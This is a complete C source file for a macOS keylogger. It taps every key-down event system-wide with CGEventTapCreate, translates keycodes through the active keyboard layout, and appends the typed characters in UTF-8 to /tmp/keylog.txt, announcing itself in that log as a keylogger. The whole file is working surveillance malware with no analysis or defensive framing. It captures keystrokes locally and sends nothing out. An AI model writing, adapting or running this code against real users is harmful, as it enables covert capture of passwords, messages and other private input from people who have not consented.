#include <stdio.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

static FILE *log_file;

CGEventRef event_callback(
    CGEventTapProxy proxy,
    CGEventType type,
    CGEventRef event,
    void *refcon
) {
    if (type != kCGEventKeyDown) {
        return event;
    }
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    CGEventFlags flags = CGEventGetFlags(event);
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardLayoutInputSource();
    CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
    UInt32 deadKeyState = 0;
    UniChar chars[4];
    UniCharCount actualLength;
    UInt32 modifierKeyState = 0;
    if (flags & kCGEventFlagMaskShift)      modifierKeyState |= shiftKey;
    if (flags & kCGEventFlagMaskAlphaShift) modifierKeyState |= alphaLock;
    if (flags & kCGEventFlagMaskControl)    modifierKeyState |= controlKey;
    if (flags & kCGEventFlagMaskAlternate)  modifierKeyState |= optionKey;
    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keycode,
        kUCKeyActionDown,
        modifierKeyState,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &deadKeyState,
        sizeof(chars) / sizeof(chars[0]),
        &actualLength,
        chars
    );
    if (status == noErr && actualLength > 0) {
        for (int i = 0; i < actualLength; i++) {
            uint16_t ch = chars[i];

            if (ch < 0x80) {
                fputc(ch, log_file);
            } else if (ch < 0x800) {
                fputc(0xC0 | (ch >> 6), log_file);
                fputc(0x80 | (ch & 0x3F), log_file);
            } else {
                fputc(0xE0 | (ch >> 12), log_file);
                fputc(0x80 | ((ch >> 6) & 0x3F), log_file);
                fputc(0x80 | (ch & 0x3F), log_file);
            }
        }
        fflush(log_file);
    }
    if (currentKeyboard) {
        CFRelease(currentKeyboard);
    }
    return event;
}

int main() {
    log_file = fopen("/tmp/keylog.txt", "a+");
    if (!log_file) {
        return 1;
    }
    fprintf(log_file, "[+] Starting keylogger\n");
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        0,
        mask,
        event_callback,
        NULL
    );
    if (!event_tap) {
        fprintf(log_file, "[x] Failed to create event tap.\n");
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "[+] Event tap created.\n");
    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes);
    CGEventTapEnable(event_tap, true);
    fprintf(log_file, "[+] Event tap enabled. Entering run loop...\n");
    fflush(log_file);
    CFRunLoopRun();
    fprintf(log_file, "[+] Exiting cleanly (unexpected)\n");
    fclose(log_file);
    return 0;
}
